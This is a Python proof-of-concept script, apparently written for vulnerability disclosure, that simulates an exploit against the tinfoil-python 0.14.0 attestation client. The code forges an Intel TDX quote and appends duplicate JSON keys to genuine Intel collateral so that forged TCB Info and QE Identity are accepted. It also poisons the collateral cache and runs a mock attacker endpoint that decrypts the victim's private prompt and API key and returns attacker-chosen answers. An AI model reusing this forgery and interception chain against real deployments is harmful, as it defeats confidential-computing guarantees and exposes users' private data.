"""
End-to-end impact simulation for the tinfoil-python (0.14.0, PyPI) duplicate-key
collateral bug, driven through the public `TinfoilAI` API with default settings
(EHBP transport, repo-based verification).

Attacker model (Tinfoil's stated in-scope adversary: operator/infrastructure,
or anyone holding WebPKI certs for the hostnames + on-path):
  * serves the enclave hostname's /.well-known/tinfoil-attestation (WebPKI TLS)
  * serves https://tdx-proxy.tinfoil.sh/... collateral responses (WebPKI TLS)
  * has root on some real Intel SGX/TDX server (FLC), so it can run its OWN
    enclave with the PROVISIONKEY attribute, which Intel's PCE certifies with
    that platform's genuine PCK key (standard DCAP behaviour; this is why
    verifiers must check QE Identity / MRSIGNER).

What is REAL here (unmodified):
  * tinfoil 0.14.0 wheel from PyPI: TinfoilAI -> SecureClient.verify ->
    verify_tdx_attestation -> validate_collateral -> fetch_* -> EHBP transport
  * Intel-signed QE Identity / TCB Info / PCK CRL / Root CRL and the genuine
    "Intel SGX TCB Signing" issuer chain (google/go-tdx-guest v0.3.1 testdata),
    verified against tinfoil's pinned Intel SGX Root CA.
  * genuine SGX PCK extension bytes (FMSPC/PCEID/CPUSVN/PCESVN) copied from a
    real SPR PCK certificate (tdx_prod_quote_SPR_E4.dat).

What is SIMULATED (the only substitutions):
  1. Clock frozen to 2023-06-30 so the captured 2023 Intel collateral and the
     2018-2025 TCB Signing cert are inside their validity windows (a real
     attacker would wrap *current* collateral from Intel PCS).
  2. The attacker platform's PCK chain: we cannot obtain Intel's signature on a
     new PCK key, so PCK-chain verification (verify_tdx.verify_intel_chain only)
     is pointed at a simulated root.  On real hardware the attacker's PCK chain
     is genuine and the PCE really signs the attacker enclave's QE report.
     Collateral chains are still verified against the REAL pinned Intel root.
  3. Sigstore / GitHub results are returned directly (code + hardware
     measurements).  These are honest, attacker-independent values; the
     attacker merely copies them into its forged quote.
"""
import base64
import copy
import datetime as _dt
import gzip
import hashlib
import json
import os
import struct
import sys
import tempfile
import time
import types
from unittest import mock

import httpx
import requests
from cryptography import x509
from cryptography.hazmat.primitives import hashes, serialization
from cryptography.hazmat.primitives.asymmetric import ec
from cryptography.hazmat.primitives.asymmetric.utils import decode_dss_signature
from cryptography.x509.oid import NameOID
from pyhpke import AEADId, CipherSuite, KDFId, KEMId

import tinfoil
import tinfoil.client as tc
import tinfoil.attestation.cert_utils as cu
import tinfoil.attestation.collateral_tdx as ct
import tinfoil.attestation.verify_tdx as vt
from tinfoil.attestation.abi_tdx import INTEL_QE_VENDOR_ID, parse_quote
from tinfoil.attestation.attestation_tdx import (
    ACCEPTED_MR_SEAMS, EXPECTED_TD_ATTRIBUTES, EXPECTED_XFAM,
)
from tinfoil.attestation.pck_extensions import OID_SGX_EXTENSION
from tinfoil.attestation.types import HardwareMeasurement, Measurement, PredicateType
from tinfoil.attestation.verify_tdx import extract_pck_cert_chain
from ehbp.derive import derive_response_keys, encrypt_chunk, frame_chunk

DATA = sys.argv[1]
ENCLAVE = "router.inference.tinfoil.example"  # hostname the victim attests
PROXY = "https://tdx-proxy.tinfoil.sh"

# --------------------------------------------------------------------------
# (sim 1) frozen clock
# --------------------------------------------------------------------------
FROZEN = _dt.datetime(2023, 6, 30, tzinfo=_dt.timezone.utc)


class FrozenDateTime(_dt.datetime):
    @classmethod
    def now(cls, tz=None):
        return FROZEN.astimezone(tz) if tz else FROZEN.replace(tzinfo=None)


cu.datetime = FrozenDateTime
ct.datetime = FrozenDateTime

# (sim 1b) The captured 2023 collateral carries tcbEvaluationDataNumber=15;
# tinfoil requires >= 19 today.  Emulate "this captured collateral is the
# current one" by setting the threshold to 15 for EVERY scenario, so the
# controls are not rejected merely because the test data is old.
import tinfoil.attestation.attestation_tdx as at
if os.environ.get("KEEP_MIN_EVAL") != "1":
    at._DEFAULT_CONFIG = at.TdxVerificationConfig(min_tcb_evaluation_data_number=15)
    ct.DEFAULT_MIN_TCB_EVALUATION_DATA_NUMBER = 15


def rd(name, mode="rb"):
    with open(os.path.join(DATA, name), mode) as f:
        return f.read()


GENUINE_QE = rd("qe_identity.json").rstrip()
GENUINE_TCB = rd("tcb_info.json").rstrip()
QE_CHAIN_HDR = rd("qeIdentityIssuerChain.txt", "r").strip()
TCB_CHAIN_HDR = rd("tcbInfoIssuerChain.txt", "r").strip()
PCK_CRL_CHAIN_HDR = rd("pckCrlIssuerChain.txt", "r").strip()
PCK_CRL_PEM = x509.load_der_x509_crl(rd("pckcrl.der")).public_bytes(serialization.Encoding.PEM)
ROOT_CRL_DER = rd("rootcrl.der")
REAL_QUOTE = rd("quote.dat")

# --------------------------------------------------------------------------
# Honest published reference values (Sigstore): code + hardware measurements
# --------------------------------------------------------------------------
H = lambda s: hashlib.sha384(s).digest()
HW_MRTD, HW_RTMR0 = H(b"published-mrtd"), H(b"published-rtmr0")
CODE_RTMR1, CODE_RTMR2 = H(b"published-rtmr1"), H(b"published-rtmr2")
CODE_MEASUREMENT = Measurement(
    type=PredicateType.SNP_TDX_MULTIPLATFORM_v1,
    registers=[H(b"published-snp").hex(), CODE_RTMR1.hex(), CODE_RTMR2.hex()],
)
HW = HardwareMeasurement(id="tdx-platform@sha256:published", mrtd=HW_MRTD.hex(), rtmr0=HW_RTMR0.hex())

# --------------------------------------------------------------------------
# Attacker key material
# --------------------------------------------------------------------------
SUITE = CipherSuite.new(KEMId.DHKEM_X25519_HKDF_SHA256, KDFId.HKDF_SHA256, AEADId.AES256_GCM)
ATT_HPKE = SUITE.kem.derive_key_pair(os.urandom(32))
ATT_HPKE_PK = ATT_HPKE.public_key.to_public_bytes()
ATT_TLS_KEY = ec.generate_private_key(ec.SECP256R1())
ATT_TLS_FP = hashlib.sha256(ATT_TLS_KEY.public_key().public_bytes(
    serialization.Encoding.DER, serialization.PublicFormat.SubjectPublicKeyInfo)).digest()
ATT_AK = ec.generate_private_key(ec.SECP256R1())              # attestation key of attacker "QE"
ATT_QE_MRSIGNER = hashlib.sha256(b"attacker enclave signing key modulus").digest()

# --------------------------------------------------------------------------
# (sim 2) attacker platform PCK chain (genuine on real hardware)
# --------------------------------------------------------------------------
real_chain = extract_pck_cert_chain(parse_quote(REAL_QUOTE))
REAL_SGX_EXT = real_chain.pck_cert.extensions.get_extension_for_oid(OID_SGX_EXTENSION).value.value


def mk_cert(subject, issuer, pub, signer, ca, exts=None):
    b = (x509.CertificateBuilder().subject_name(subject).issuer_name(issuer).public_key(pub)
         .serial_number(x509.random_serial_number())
         .not_valid_before(_dt.datetime(2022, 1, 1, tzinfo=_dt.timezone.utc))
         .not_valid_after(_dt.datetime(2030, 1, 1, tzinfo=_dt.timezone.utc)))
    if exts is None:
        exts = [(x509.BasicConstraints(ca=ca, path_length=None), True)]
    for e, crit in exts:
        b = b.add_extension(e, critical=crit)
    return b.sign(signer, hashes.SHA256())


SIM_ROOT_KEY, SIM_CA_KEY, SIM_PCK_KEY = (ec.generate_private_key(ec.SECP256R1()) for _ in range(3))
SIM_ROOT = mk_cert(real_chain.root_cert.subject, real_chain.root_cert.subject, SIM_ROOT_KEY.public_key(), SIM_ROOT_KEY, True)
SIM_CA = mk_cert(real_chain.intermediate_cert.subject, SIM_ROOT.subject, SIM_CA_KEY.public_key(), SIM_ROOT_KEY, True)
_real_exts = real_chain.pck_cert.extensions
# Same 6-extension shape as a genuine Intel PCK certificate.
SIM_PCK = mk_cert(real_chain.pck_cert.subject, SIM_CA.subject, SIM_PCK_KEY.public_key(), SIM_CA_KEY, False, [
    (x509.AuthorityKeyIdentifier.from_issuer_public_key(SIM_CA_KEY.public_key()), False),
    (_real_exts.get_extension_for_class(x509.CRLDistributionPoints).value, False),
    (x509.SubjectKeyIdentifier.from_public_key(SIM_PCK_KEY.public_key()), False),
    (_real_exts.get_extension_for_class(x509.KeyUsage).value, True),
    (x509.BasicConstraints(ca=False, path_length=None), True),
    (x509.UnrecognizedExtension(OID_SGX_EXTENSION, REAL_SGX_EXT), False),
])
PCK_CHAIN_PEM = b"".join(c.public_bytes(serialization.Encoding.PEM) for c in (SIM_PCK, SIM_CA, SIM_ROOT))

_real_verify_intel_chain = cu.verify_intel_chain


def _pck_chain_verify(certs, chain_name="PCK certificate chain"):
    # Only the PCK chain (verify_tdx.verify_pck_chain) uses this; collateral
    # issuer chains keep using the real function and the real pinned Intel root.
    with mock.patch.object(cu, "get_intel_root_ca", lambda: SIM_ROOT):
        return _real_verify_intel_chain(certs, chain_name)


vt.verify_intel_chain = _pck_chain_verify


def rs(sig_der):
    r, s = decode_dss_signature(sig_der)
    return r.to_bytes(32, "big") + s.to_bytes(32, "big")


# --------------------------------------------------------------------------
# Forged TD quote produced by the attacker's own quoting enclave
# --------------------------------------------------------------------------
def build_forged_quote() -> bytes:
    header = struct.pack("<HHI", 4, 2, 0x81) + b"\x00" * 4 + INTEL_QE_VENDOR_ID + b"\x00" * 20
    tee_tcb_svn = bytes([3, 1, 5]) + b"\x00" * 13                     # >= policy minimum 03.01.02
    body = (tee_tcb_svn + ACCEPTED_MR_SEAMS[0] + b"\x00" * 48 + b"\x00" * 8
            + EXPECTED_TD_ATTRIBUTES + EXPECTED_XFAM + HW_MRTD
            + b"\x00" * 48 * 3                                        # MRCONFIGID, MROWNER, MROWNERCONFIG
            + HW_RTMR0 + CODE_RTMR1 + CODE_RTMR2 + b"\x00" * 48        # RTMR0..3
            + ATT_TLS_FP + ATT_HPKE_PK)                                # REPORTDATA = attacker keys
    assert len(header) == 48 and len(body) == 584
    nums = ATT_AK.public_key().public_numbers()
    ak_raw = nums.x.to_bytes(32, "big") + nums.y.to_bytes(32, "big")
    quote_sig = rs(ATT_AK.sign(header + body, ec.ECDSA(hashes.SHA256())))
    auth_data = bytes(range(32))
    cpusvn = bytes.fromhex("03030202020100020000000000000000")
    qe_report = (cpusvn + b"\x00" * 4 + b"\x00" * 28
                 + bytes.fromhex("1500000000000000e700000000000000")   # INIT|MODE64|PROVISIONKEY
                 + hashlib.sha256(b"attacker QE code").digest() + b"\x00" * 32
                 + ATT_QE_MRSIGNER + b"\x00" * 96
                 + struct.pack("<HH", 2, 4) + b"\x00" * 60
                 + hashlib.sha256(ak_raw + auth_data).digest() + b"\x00" * 32)
    assert len(qe_report) == 384
    qe_sig = rs(SIM_PCK_KEY.sign(qe_report, ec.ECDSA(hashes.SHA256())))  # = PCE certify_enclave
    inner = (qe_report + qe_sig + struct.pack("<H", len(auth_data)) + auth_data
             + struct.pack("<HI", 5, len(PCK_CHAIN_PEM)) + PCK_CHAIN_PEM)
    signed = quote_sig + ak_raw + struct.pack("<HI", 6, len(inner)) + inner
    return header + body + struct.pack("<I", len(signed)) + signed


FORGED_QUOTE = build_forged_quote()
DOC_BODY = base64.b64encode(gzip.compress(FORGED_QUOTE)).decode()
ATTESTATION_DOC = json.dumps({"format": PredicateType.TDX_GUEST_V2.value, "body": DOC_BODY}).encode()

# Bundle mode (proxy-friendly): Tinfoil-operated bundle service + gateway.
BUNDLE_SERVICE = "https://atc.tinfoil.example"
GATEWAY = "https://gateway.tinfoil.example/v1/"


def _dcode(data: bytes, prefix: str, domain: str):
    s = base64.b32encode(data).decode().rstrip("=").lower()
    return [f"{i:02d}{s[j:j + 60]}.{prefix}.{domain}" for i, j in enumerate(range(0, len(s), 60))]


def _enclave_cert_pem() -> str:
    from tinfoil.attestation import Document
    doc_hash = Document(format=PredicateType.TDX_GUEST_V2, body=DOC_BODY).hash()
    sans = [ENCLAVE] + _dcode(ATT_HPKE_PK, "hpke", ENCLAVE) + _dcode(doc_hash.encode(), "hatt", ENCLAVE)
    name = x509.Name([x509.NameAttribute(NameOID.COMMON_NAME, ENCLAVE)])
    cert = (x509.CertificateBuilder().subject_name(name).issuer_name(name).public_key(ATT_TLS_KEY.public_key())
            .serial_number(x509.random_serial_number())
            .not_valid_before(_dt.datetime(2022, 1, 1, tzinfo=_dt.timezone.utc))
            .not_valid_after(_dt.datetime(2030, 1, 1, tzinfo=_dt.timezone.utc))
            .add_extension(x509.SubjectAlternativeName([x509.DNSName(s) for s in sans]), critical=False)
            .sign(ATT_TLS_KEY, hashes.SHA256()))
    return cert.public_bytes(serialization.Encoding.PEM).decode()


BUNDLE_JSON = json.dumps({
    "domain": ENCLAVE,
    "enclaveAttestationReport": {"format": PredicateType.TDX_GUEST_V2.value, "body": DOC_BODY},
    "digest": "d" * 64, "sigstoreBundle": {}, "vcek": "", "enclaveCert": _enclave_cert_pem(), "releaseTag": "v0.0.0",
}).encode()


# --------------------------------------------------------------------------
# Collateral variants: genuine, or genuine + appended duplicate key
# --------------------------------------------------------------------------
def append_duplicate(genuine: bytes, key: str, forged_obj: dict) -> bytes:
    assert genuine.endswith(b"}")
    return genuine[:-1] + b',"' + key.encode() + b'":' + json.dumps(forged_obj, separators=(",", ":")).encode() + b"}"


def forged_tcb_info() -> bytes:
    t = copy.deepcopy(json.loads(GENUINE_TCB)["tcbInfo"])
    zero = lambda: [{"svn": 0} for _ in range(16)]
    t.update(nextUpdate="2099-01-01T00:00:00Z", tcbEvaluationDataNumber=99,
             tdxModuleIdentities=[{"id": "TDX_01", "mrsigner": "00" * 48, "attributes": "0000000000000000",
                                   "attributesMask": "FFFFFFFFFFFFFFFF",
                                   "tcbLevels": [{"tcb": {"isvsvn": 0}, "tcbDate": "2023-02-15T00:00:00Z",
                                                  "tcbStatus": "UpToDate"}]}],
             tcbLevels=[{"tcb": {"sgxtcbcomponents": zero(), "pcesvn": 0, "tdxtcbcomponents": zero()},
                         "tcbDate": "2023-02-15T00:00:00Z", "tcbStatus": "UpToDate"}])
    return append_duplicate(GENUINE_TCB, "tcbInfo", t)


def forged_qe_identity() -> bytes:
    e = copy.deepcopy(json.loads(GENUINE_QE)["enclaveIdentity"])
    e.update(mrsigner=ATT_QE_MRSIGNER.hex().upper(), nextUpdate="2099-01-01T00:00:00Z",
             tcbEvaluationDataNumber=99)
    return append_duplicate(GENUINE_QE, "enclaveIdentity", e)


# --------------------------------------------------------------------------
# Attacker-controlled network: WebPKI-TLS fetches of attestation + collateral
# --------------------------------------------------------------------------
def make_network(tcb_body, qe_body, serve_collateral=True):
    log = []

    def resp(url, content, hdrs=None):
        r = requests.Response()
        r.status_code, r._content, r.url, r.encoding = 200, content, url, "utf-8"
        for k, v in (hdrs or {}).items():
            r.headers[k] = v
        return r

    def get(url, headers=None, timeout=None, **kw):
        log.append(url)
        if url == f"https://{ENCLAVE}/.well-known/tinfoil-attestation":
            return resp(url, ATTESTATION_DOC)
        if url == f"{BUNDLE_SERVICE}/attestation":
            return resp(url, BUNDLE_JSON)
        if not serve_collateral:
            raise requests.ConnectionError(f"(collateral path not attacker-controlled now) {url}")
        if url.startswith(f"{PROXY}/api.trustedservices.intel.com/tdx/certification/v4/tcb?"):
            return resp(url, tcb_body, {"TCB-Info-Issuer-Chain": TCB_CHAIN_HDR})
        if url.startswith(f"{PROXY}/api.trustedservices.intel.com/tdx/certification/v4/qe/identity?"):
            return resp(url, qe_body, {"SGX-Enclave-Identity-Issuer-Chain": QE_CHAIN_HDR})
        if url.startswith(f"{PROXY}/api.trustedservices.intel.com/sgx/certification/v4/pckcrl?ca=platform"):
            return resp(url, PCK_CRL_PEM, {"SGX-PCK-CRL-Issuer-Chain": PCK_CRL_CHAIN_HDR})
        if url == f"{PROXY}/certificates.trustedservices.intel.com/IntelSGXRootCA.der":
            return resp(url, ROOT_CRL_DER)
        raise AssertionError(f"unexpected network access: {url}")

    return get, log


# --------------------------------------------------------------------------
# Attacker's inference endpoint (reached via DNS/WebPKI control): decrypts
# EHBP request bodies with the attacker HPKE key and answers validly.
# --------------------------------------------------------------------------
CAPTURED = []


def attacker_server(request: httpx.Request) -> httpx.Response:
    enc = bytes.fromhex(request.headers["Ehbp-Encapsulated-Key"])
    body = request.read()
    ctx = SUITE.create_recipient_context(enc, ATT_HPKE.private_key, info=b"ehbp request")
    off, plain = 0, b""
    while off < len(body):
        (n,) = struct.unpack(">I", body[off:off + 4]); off += 4
        plain += ctx.open(body[off:off + n], b""); off += n
    CAPTURED.append((request.method, str(request.url), request.headers.get("authorization"), plain))
    exported = ctx.export(b"ehbp response", 32)
    nonce = os.urandom(32)
    km = derive_response_keys(exported, enc, nonce)
    answer = json.dumps({
        "id": "chatcmpl-x", "object": "chat.completion", "created": int(time.time()), "model": "llama3-3-70b",
        "choices": [{"index": 0, "finish_reason": "stop",
                     "message": {"role": "assistant", "content": "ATTACKER-CHOSEN ANSWER"}}],
    }).encode()
    return httpx.Response(200, headers={"Ehbp-Response-Nonce": nonce.hex(), "content-type": "application/json"},
                          content=frame_chunk(encrypt_chunk(km, 0, answer)))


# --------------------------------------------------------------------------
def run(label, tcb_body, qe_body, cache_dir, serve_collateral=True, chat=False, bundle=False):
    print(f"\n=== {label}")
    get, log = make_network(tcb_body, qe_body, serve_collateral)
    ctor_kwargs = dict(enclave=ENCLAVE, api_key="sk-victim-api-key")
    if bundle:
        ctor_kwargs = dict(api_key="sk-victim-api-key", base_url=GATEWAY, attestation_bundle_url=BUNDLE_SERVICE)
    with mock.patch.object(ct, "_TDX_CACHE_DIR", cache_dir), \
         mock.patch.object(requests, "get", get), \
         mock.patch.object(httpx, "HTTPTransport", lambda *a, **k: httpx.MockTransport(attacker_server)), \
         mock.patch.object(tc, "fetch_latest_release", lambda repo: types.SimpleNamespace(digest="d" * 64, tag="v0.0.0")), \
         mock.patch.object(tc, "fetch_attestation_bundle", lambda repo, digest: b"{}"), \
         mock.patch.object(tc, "verify_attestation", lambda *a, **k: CODE_MEASUREMENT), \
         mock.patch.object(tc, "fetch_latest_hardware_measurements", lambda: [HW]):
        try:
            client = tinfoil.TinfoilAI(**ctor_kwargs)
        except Exception as e:
            print(f"  [REJECTED] TinfoilAI() verification failed: {type(e).__name__}: {str(e)[:150]}")
            print("  network:", [u.split('?')[0].replace(PROXY, 'tdx-proxy') for u in log])
            return False
        doc = client.get_verification_document()
        print(f"  [ACCEPTED] securityVerified={doc.security_verified} hpkePublicKey==attacker: "
              f"{doc.hpke_public_key == ATT_HPKE_PK.hex()} tlsFP==attacker: {doc.tls_public_key == ATT_TLS_FP.hex()}")
        print("  network:", [u.split('?')[0].replace(PROXY, 'tdx-proxy') for u in log])
        if chat:
            out = client.chat.completions.create(
                model="llama3-3-70b",
                messages=[{"role": "user", "content": "PRIVATE: my diagnosis is X, what should I do?"}])
            m, url, auth, plain = CAPTURED[-1]
            print(f"  attacker endpoint decrypted {m} {url}: {plain.decode()[:120]}")
            print(f"  victim received (EHBP-authenticated) answer: {out.choices[0].message.content!r}")
        return True


def main():
    print("forged quote: QE MRSIGNER =", ATT_QE_MRSIGNER.hex(), "| Intel TD_QE MRSIGNER =",
          json.loads(GENUINE_QE)["enclaveIdentity"]["mrsigner"].lower())
    results = {}
    with tempfile.TemporaryDirectory() as d:
        results["S0 genuine TCB Info + genuine QE Identity"] = run(
            "S0 control: genuine Intel collateral", GENUINE_TCB, GENUINE_QE, os.path.join(d, "c0"))
    with tempfile.TemporaryDirectory() as d:
        results["S1 forged TCB Info + genuine QE Identity"] = run(
            "S1 ablation: dup-key TCB Info only (QE Identity genuine)", forged_tcb_info(), GENUINE_QE, os.path.join(d, "c1"))
    with tempfile.TemporaryDirectory() as d:
        cache = os.path.join(d, "c2")
        results["S2 forged TCB Info + forged QE Identity"] = run(
            "S2 attack: dup-key TCB Info + dup-key QE Identity", forged_tcb_info(), forged_qe_identity(), cache, chat=True)
        results["S3 later session, collateral path honest/unreachable, poisoned cache"] = run(
            "S3 persistence: new TinfoilAI() later; attacker no longer on collateral path", None, None, cache,
            serve_collateral=False)
    with tempfile.TemporaryDirectory() as d:
        results["S4b bundle+gateway mode, dup-key TCB Info + GENUINE QE Identity"] = run(
            "S4b ablation: bundle/gateway mode, dup-key TCB Info but genuine QE Identity", forged_tcb_info(), GENUINE_QE,
            os.path.join(d, "c4b"), bundle=True)
    with tempfile.TemporaryDirectory() as d:
        results["S4 bundle+gateway mode (Tinfoil bundle service + gateway + tdx-proxy)"] = run(
            "S4 attack: proxy-friendly bundle mode, attacker = bundle service + gateway + tdx-proxy",
            forged_tcb_info(), forged_qe_identity(), os.path.join(d, "c4"), chat=True, bundle=True)
    print("\nSUMMARY")
    for k, v in results.items():
        print(f"  {k}: {'ACCEPTED' if v else 'REJECTED'}")


if __name__ == "__main__":
    main()
